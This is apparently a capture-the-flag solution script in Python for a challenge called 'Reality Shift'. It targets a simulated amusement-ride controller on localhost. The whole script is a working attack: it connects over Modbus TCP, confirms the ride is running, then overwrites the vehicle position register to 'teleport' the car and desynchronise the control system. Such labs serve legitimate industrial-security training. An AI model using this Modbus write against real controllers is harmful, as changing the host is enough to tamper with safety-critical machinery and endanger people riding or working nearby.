#!/usr/bin/env python3
"""
Challenge 06: Reality Shift (250 points)
Difficulty: Medium

Objective: Manipulate the vehicle position register using a direct Modbus write
to teleport across zones instantly.

Requirements:
- Ride must be running (state = 2)
- Write to position register via Modbus (MW1)
- Position jump must be > 5 positions
- Must be direct Modbus write

Educational Value:
- Learn position register manipulation
- Understand vehicle tracking systems
- Practice state desynchronization attacks
"""

from pymodbus.client import ModbusTcpClient
import time

PLC_HOST = 'localhost'
MAIN_PLC_PORT = 502

def teleport_position():
    """
    Teleport vehicle position via register write
    """
    print("=" * 60)
    print("Challenge 06: Reality Shift")
    print("=" * 60)
    print()

    client = ModbusTcpClient(PLC_HOST, port=MAIN_PLC_PORT)

    if not client.connect():
        print("✗ Failed to connect to Main PLC")
        return False

    print(f"✓ Connected to Main PLC at {PLC_HOST}:{MAIN_PLC_PORT}")
    print()

    # Check if ride is running
    result = client.read_holding_registers(2, 1, slave=1)
    if result.isError():
        print("✗ Failed to read ride state")
        client.close()
        return False

    state = result.registers[0]
    state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency']
    print(f"Current State: {state} ({state_names[state] if state < len(state_names) else 'Unknown'})")

    if state != 2:
        print()
        print("⚠️  Ride is not running!")
        print("   Start the ride first, then run this script.")
        client.close()
        return False

    # Read current position
    result = client.read_holding_registers(1, 1, slave=1)
    if result.isError():
        print("✗ Failed to read current position")
        client.close()
        return False

    current_position = result.registers[0]
    print(f"Current Position: {current_position} / 25")
    print()

    # Calculate teleport target (jump at least 6 positions forward)
    target_position = (current_position + 10) % 26
    print(f"Teleporting vehicle from position {current_position} to {target_position}")
    print(f"  (jump of {abs(target_position - current_position)} positions)")
    print()

    print("Executing attack...")
    print(f"  → Writing {target_position} to current_position (MW1)")

    # Write new position
    result = client.write_register(1, target_position, slave=1)
    if not result.isError():
        print(f"  ✓ Position register overwritten!")
        print()
        print("⚠️  Vehicle has been teleported across zones!")
        print("   This creates a reality desynchronization in the control system.")
        print()
        print("🎯 Challenge 06 should now be completed!")
        print("   Check the CTF dashboard to verify.")

        # Show new position
        time.sleep(1)
        result = client.read_holding_registers(1, 1, slave=1)
        if not result.isError():
            new_position = result.registers[0]
            print()
            print(f"Verified New Position: {new_position} / 25")

        client.close()
        return True
    else:
        print("  ✗ Failed to write register")
        client.close()
        return False

if __name__ == "__main__":
    try:
        teleport_position()
    except KeyboardInterrupt:
        print("\n\n✗ Attack interrupted by user")
    except Exception as e:
        print(f"\n✗ Attack failed: {e}")
